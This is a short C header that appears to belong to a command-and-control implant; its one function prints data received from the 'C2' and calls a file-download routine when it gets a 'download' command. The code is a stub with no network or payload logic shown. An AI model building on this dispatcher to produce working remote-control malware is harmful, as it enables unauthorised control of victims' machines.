#pragma once
#include "downloadFile.h"

/* This function is responsible for figuring out what to do based off the data sent by the C2 (calling download, upload functions etc.) */
int makeDecision(char *recv, int recvlen) {
	
	printf("This is the data that was recieved: %s\n", recv);
	printf("Length: %d\n", recvlen);

	if (strncmp(recv, "download", recvlen-1) == 0) {
		downloadFile();
	}
	return 0;
}